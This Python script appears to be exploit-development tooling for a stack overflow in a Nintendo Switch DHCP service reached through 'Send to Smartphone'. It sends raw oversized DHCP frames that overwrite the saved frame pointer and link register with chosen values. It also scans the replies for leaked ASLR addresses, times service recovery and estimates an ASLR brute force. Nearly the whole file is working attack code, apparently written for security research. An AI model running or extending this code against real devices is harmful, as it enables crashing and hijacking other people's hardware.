#!/usr/bin/env -S sudo python3 -u -I
"""
CVE-2026-82079: Controlled overflow test.

After the size probe confirmed the overflow is reachable at MTU 2304,
this script performs targeted tests:

  1. DHCP response capture — send oversized packet, capture reply for
     info-leak analysis BEFORE the crash
  2. Recovery test — measure how long until the DHCP server restarts
  3. Controlled LR overwrite — send packet with known pattern at FP/LR

Requires: root, MTU 2304 on wlp5s0, Switch in Send to Smartphone.
"""

import socket
import struct
import time
import os
import json
import sys
import threading
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')

# From assembly-verified stack geometry:
BUFFER_SIZE = 1500
FP_OFFSET = 1668     # bytes from frame start to saved x29
LR_OFFSET = 1676     # bytes from frame start to saved x30
ETH_IP_UDP = 42      # 14 + 20 + 8
BOOTP_FIXED = 236
DHCP_OPTIONS_BASE = 14  # magic(4) + opt53(3) + opt55(6) + end(1)


def get_mac(iface):
    with open(f'/sys/class/net/{iface}/address') as f:
        return bytes.fromhex(f.read().strip().replace(':', ''))


def get_mtu(iface):
    with open(f'/sys/class/net/{iface}/mtu') as f:
        return int(f.read().strip())


def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff


def udp_checksum(src_ip, dst_ip, udp_no_cksum, payload):
    pseudo = struct.pack('!4s4sBBH', src_ip, dst_ip, 0, 17,
                         len(udp_no_cksum) + len(payload))
    data = pseudo + udp_no_cksum + payload
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    result = ~s & 0xffff
    return result if result else 0xffff


def build_overflow_frame(our_mac, total_frame_size, fill=0x00,
                         fp_value=None, lr_value=None,
                         callee_regs=None):
    """Build DHCP DISCOVER with controlled overflow data.

    Args:
        total_frame_size: total Ethernet frame bytes
        fill: byte to fill padding with (default 0x00 = option pad)
        fp_value: 8-byte value at saved FP offset (default: fill bytes)
        lr_value: 8-byte value at saved LR offset (default: fill bytes)
        callee_regs: dict of {offset: 8-byte value} for callee-saved regs
    """
    xid = int.from_bytes(os.urandom(4), 'big')

    # Build DHCP payload with controlled content at specific offsets
    # Layout within the Ethernet frame:
    #   [0..13]  Ethernet header (14B)
    #   [14..33] IP header (20B)
    #   [34..41] UDP header (8B)
    #   [42..]   DHCP data (BOOTP + options)
    #
    # In the ldn stack buffer, the memcpy destination starts at byte 0
    # of the total frame. So frame byte N = buffer byte N.
    # FP at frame byte 1668, LR at frame byte 1676.

    # Start with BOOTP header
    bootp = struct.pack('!BBBBI HH',
                        1, 1, 6, 0, xid, 0, 0x8000)
    bootp += b'\x00' * 16
    bootp += our_mac + b'\x00' * 10
    bootp += b'\x00' * 64
    bootp += b'\x00' * 128
    assert len(bootp) == 236

    # DHCP options with controlled padding
    opts = struct.pack('!I', 0x63825363)
    opts += bytes([53, 1, 1])
    opts += bytes([55, 4, 1, 3, 6, 15])

    # Calculate how much padding we need
    current_dhcp = len(bootp) + len(opts) + 1  # +1 for end marker
    total_dhcp_needed = total_frame_size - ETH_IP_UDP
    pad_needed = max(0, total_dhcp_needed - current_dhcp)

    # Build the padding as a bytearray so we can patch specific offsets
    padding = bytearray([fill] * pad_needed)

    # The padding starts at frame offset = 42 + 236 + 13 = 291
    # (eth+ip+udp + bootp + options_before_padding)
    pad_frame_start = ETH_IP_UDP + len(bootp) + len(opts)

    # Patch FP if specified
    if fp_value is not None and total_frame_size > FP_OFFSET:
        fp_pad_offset = FP_OFFSET - pad_frame_start
        if 0 <= fp_pad_offset <= len(padding) - 8:
            padding[fp_pad_offset:fp_pad_offset + 8] = fp_value

    # Patch LR if specified
    if lr_value is not None and total_frame_size > LR_OFFSET:
        lr_pad_offset = LR_OFFSET - pad_frame_start
        if 0 <= lr_pad_offset <= len(padding) - 8:
            padding[lr_pad_offset:lr_pad_offset + 8] = lr_value

    # Patch callee-saved registers if specified
    if callee_regs:
        for offset, value in callee_regs.items():
            pad_offset = offset - pad_frame_start
            if 0 <= pad_offset <= len(padding) - 8:
                padding[pad_offset:pad_offset + 8] = value

    opts += bytes(padding)
    opts += bytes([255])

    dhcp = bootp + opts

    # UDP
    udp_len = 8 + len(dhcp)
    src_ip = socket.inet_aton('0.0.0.0')
    dst_ip = socket.inet_aton('255.255.255.255')
    udp_no_ck = struct.pack('!HHH', 68, 67, udp_len) + b'\x00\x00'
    uck = udp_checksum(src_ip, dst_ip, udp_no_ck, dhcp)
    udp_hdr = struct.pack('!HHHH', 68, 67, udp_len, uck)

    # IP
    ip_total = 20 + udp_len
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         0x45, 0x00, ip_total,
                         xid & 0xffff, 0x4000,
                         64, 17, 0,
                         src_ip, dst_ip)
    ick = ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack('!H', ick) + ip_hdr[12:]

    # Ethernet
    eth_hdr = b'\xff\xff\xff\xff\xff\xff' + our_mac + struct.pack('!H', 0x0800)

    return eth_hdr + ip_hdr + udp_hdr + dhcp, xid


def check_http(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp
    except Exception:
        return False


def capture_dhcp_response(iface, timeout=3.0):
    """Capture a single DHCP response frame."""
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                         socket.htons(0x0800))
    sock.bind((iface, 0))
    sock.settimeout(0.2)
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            data = sock.recv(4096)
            if len(data) < 42:
                continue
            if struct.unpack('!H', data[12:14])[0] != 0x0800:
                continue
            if data[23] != 17:
                continue
            sp, dp = struct.unpack('!HH', data[34:38])
            if sp == 67 and dp == 68 and data[42] == 2:
                sock.close()
                return data
        except socket.timeout:
            continue
    sock.close()
    return None


def scan_for_addresses(data):
    """Scan binary data for potential Horizon ASLR addresses."""
    findings = []
    if not data or len(data) < 8:
        return findings
    for i in range(len(data) - 7):
        val = struct.unpack_from('<Q', data, i)[0]
        if 0x0000007100000000 <= val <= 0x000000710FFFFFFF:
            findings.append(('code', i, val))
        elif 0x0000007F00000000 <= val <= 0x0000007FFFFFFFFF:
            findings.append(('stack', i, val))
    return findings


def main():
    if os.geteuid() != 0:
        print("Requires root.")
        sys.exit(1)

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    our_mac = get_mac(IFACE)
    mtu = get_mtu(IFACE)

    if mtu < 2304:
        print(f"MTU is {mtu}, need 2304. Run: sudo ip link set {IFACE} mtu 2304")
        sys.exit(1)

    print("=" * 65)
    print("CVE-2026-82079  CONTROLLED OVERFLOW TEST")
    print("=" * 65)
    print(f"Interface: {IFACE}, MAC: {our_mac.hex(':')}, MTU: {mtu}\n")

    if not check_http():
        print("HTTP not responding. Start Send to Smartphone and reconnect.")
        sys.exit(1)
    print("HTTP server alive.\n")

    raw_tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                           socket.htons(0x0800))
    raw_tx.bind((IFACE, 0))

    results = []

    # ================================================================
    # TEST 1: Capture DHCP response from safe-sized packet (baseline)
    # ================================================================
    print("[Test 1] Baseline DHCP response (1400B, within buffer)")
    frame, xid = build_overflow_frame(our_mac, 1400)
    raw_tx.send(frame)
    resp = capture_dhcp_response(IFACE, timeout=3.0)
    if resp:
        print(f"  Response: {len(resp)} bytes")
        addrs = scan_for_addresses(resp[42:])  # scan DHCP portion
        print(f"  Address patterns in response: {len(addrs)}")
        for kind, off, val in addrs[:5]:
            print(f"    {kind} @ resp[{42+off}]: 0x{val:016x}")
        results.append({
            'test': 'baseline_response', 'frame_size': 1400,
            'response_size': len(resp),
            'response_hex': resp.hex(),
            'addresses_found': len(addrs),
        })
    else:
        print("  No response captured")
        results.append({'test': 'baseline_response', 'response': None})

    alive = check_http()
    print(f"  HTTP: {'alive' if alive else 'UNAVAILABLE'}\n")

    # ================================================================
    # TEST 2: Capture response from overflow-but-safe packet (1650B)
    # ================================================================
    if check_http():
        print("[Test 2] Overflow response (1650B, past layer_info, before FP)")
        frame, xid = build_overflow_frame(our_mac, 1650, fill=0x41)
        raw_tx.send(frame)
        resp = capture_dhcp_response(IFACE, timeout=3.0)
        if resp:
            print(f"  Response: {len(resp)} bytes")
            addrs = scan_for_addresses(resp[42:])
            print(f"  Address patterns in response: {len(addrs)}")
            for kind, off, val in addrs[:5]:
                print(f"    {kind} @ resp[{42+off}]: 0x{val:016x}")
            results.append({
                'test': 'overflow_safe_response', 'frame_size': 1650,
                'response_size': len(resp),
                'response_hex': resp.hex(),
                'addresses_found': len(addrs),
            })
        else:
            print("  No response captured")
            results.append({'test': 'overflow_safe_response', 'response': None})

        alive = check_http()
        print(f"  HTTP: {'alive' if alive else 'UNAVAILABLE'}\n")

    # ================================================================
    # TEST 3: Capture response from FP-overwrite packet (1676B)
    #         The response arrives BEFORE the crash.
    # ================================================================
    if check_http():
        print("[Test 3] FP+LR overwrite (1684B, controlled registers)")
        print("  FP = 0xDEAD...0001, LR = 0xDEAD...0002")
        print("  Expecting: DHCP response, then crash\n")

        frame, xid = build_overflow_frame(
            our_mac, 1684, fill=0x41,
            fp_value=struct.pack('<Q', 0xDEADDEAD00000001),
            lr_value=struct.pack('<Q', 0xDEADDEAD00000002),
        )
        raw_tx.send(frame)
        resp = capture_dhcp_response(IFACE, timeout=3.0)

        if resp:
            print(f"  DHCP response CAPTURED before crash: {len(resp)} bytes")
            addrs = scan_for_addresses(resp[42:])
            print(f"  Address patterns in response: {len(addrs)}")
            for kind, off, val in addrs[:5]:
                print(f"    {kind} @ resp[{42+off}]: 0x{val:016x}")

            # Compare response with baseline
            results.append({
                'test': 'fp_lr_overwrite_response', 'frame_size': 1684,
                'response_size': len(resp),
                'response_hex': resp.hex(),
                'addresses_found': len(addrs),
                'fp_set': '0xDEADDEAD00000001',
                'lr_set': '0xDEADDEAD00000002',
            })
        else:
            print("  No response captured (may have crashed too fast)")
            results.append({'test': 'fp_lr_overwrite_response', 'response': None})

        # ============================================================
        # TEST 4: Recovery timing — does ldn restart?
        # ============================================================
        print("\n[Test 4] Recovery timing")
        crash_time = time.monotonic()
        recovered = False
        # Check HTTP every second for 2 minutes
        for i in range(120):
            time.sleep(1)
            if check_http():
                elapsed = time.monotonic() - crash_time
                print(f"  HTTP recovered after {elapsed:.1f}s")
                recovered = True
                results.append({
                    'test': 'recovery', 'recovered': True,
                    'seconds': round(elapsed, 1),
                })
                break

        if not recovered:
            print("  No recovery after 120s")
            print("  Restart Send to Smartphone on the Switch")
            results.append({'test': 'recovery', 'recovered': False})

        # If recovered, test if DHCP also works
        if recovered:
            print("\n[Test 4b] Post-recovery DHCP test")
            frame2, xid2 = build_overflow_frame(our_mac, 300)
            raw_tx.send(frame2)
            resp2 = capture_dhcp_response(IFACE, timeout=3.0)
            if resp2:
                print(f"  DHCP response after recovery: YES ({len(resp2)}B)")
                results.append({'test': 'post_recovery_dhcp', 'response': True})

                # ============================================================
                # TEST 5: Second crash — confirm reproducible
                # ============================================================
                print("\n[Test 5] Reproducibility — second FP/LR overwrite")
                frame3, xid3 = build_overflow_frame(
                    our_mac, 1684, fill=0x42,
                    fp_value=struct.pack('<Q', 0xBAADF00D00000001),
                    lr_value=struct.pack('<Q', 0xBAADF00D00000002),
                )
                raw_tx.send(frame3)
                resp3 = capture_dhcp_response(IFACE, timeout=3.0)
                if resp3:
                    print(f"  DHCP response CAPTURED: {len(resp3)} bytes")
                else:
                    print("  No response")

                time.sleep(2)
                alive3 = check_http()
                print(f"  HTTP after 2nd crash: {'alive' if alive3 else 'UNAVAILABLE'}")
                results.append({
                    'test': 'reproducibility',
                    'response': resp3 is not None,
                    'http_after': alive3,
                })

                if not alive3:
                    # Measure second recovery
                    print("  Measuring 2nd recovery...")
                    t0 = time.monotonic()
                    for i in range(120):
                        time.sleep(1)
                        if check_http():
                            t1 = time.monotonic() - t0
                            print(f"  2nd recovery: {t1:.1f}s")
                            results.append({
                                'test': 'recovery_2',
                                'recovered': True,
                                'seconds': round(t1, 1),
                            })
                            break
                    else:
                        print("  2nd recovery failed")
                        results.append({'test': 'recovery_2', 'recovered': False})

            else:
                print("  No DHCP response after recovery")
                results.append({'test': 'post_recovery_dhcp', 'response': False})

    raw_tx.close()

    # Save evidence
    path = f"{EVIDENCE_DIR}/overflow_test_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'interface': IFACE,
            'mac': our_mac.hex(':'),
            'mtu': mtu,
            'tests': results,
        }, f, indent=2)
    print(f"\nEvidence: {path}")

    # Summary
    print("\n" + "=" * 65)
    print("SUMMARY")
    print("=" * 65)
    for r in results:
        t = r.get('test', '?')
        if t == 'recovery':
            if r['recovered']:
                print(f"  ldn auto-restart: YES ({r['seconds']}s)")
                print(f"  → ASLR brute force feasible at ~1 attempt/{r['seconds']:.0f}s")
                attempts = 131072
                avg_time = attempts // 2 * r['seconds']
                print(f"  → Average brute force: {avg_time/3600:.0f} hours "
                      f"({attempts//2} attempts × {r['seconds']:.0f}s)")
            else:
                print(f"  ldn auto-restart: NO (manual restart required)")
                print(f"  → ASLR brute force NOT feasible")

    # Check for any leaked addresses
    any_leak = False
    for r in results:
        if r.get('addresses_found', 0) > 0:
            any_leak = True
            print(f"\n  ** ADDRESSES FOUND in {r['test']}! **")
    if not any_leak:
        print(f"\n  No address leaks detected in DHCP responses.")


if __name__ == '__main__':
    main()
